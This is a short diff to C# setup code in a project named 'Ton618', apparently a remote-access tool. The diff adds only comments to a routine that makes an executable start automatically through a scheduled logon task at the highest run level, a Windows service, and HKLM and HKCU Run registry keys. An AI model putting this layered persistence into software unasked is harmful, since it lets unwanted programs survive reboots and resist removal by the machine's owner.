@@ -13,6 +13,7 @@ namespace Ton618.Setup
         {
             if (UserAccount.Type == AccountType.Admin)
             {
+                // Task scheduler
                 var startInfo = new ProcessStartInfo("schtasks")
                 {
                     Arguments = "/create /tn \"" + startupName + "\" /sc ONLOGON /tr \"" + executablePath + "\" /rl HIGHEST /f",
@@ -23,6 +24,7 @@ namespace Ton618.Setup
                 var p = Process.Start(startInfo);
                 p.WaitForExit(1000);
 
+                // Service
                 startInfo = new ProcessStartInfo("sc")
                 {
                     // TODO: Custom name for service
@@ -34,9 +36,11 @@ namespace Ton618.Setup
                 p = Process.Start(startInfo);
                 p.WaitForExit(1000);
 
+                // HKLM Autorun
                 RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
             }
 
+            // HKCU Autorun
             RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath, true);
         }
 
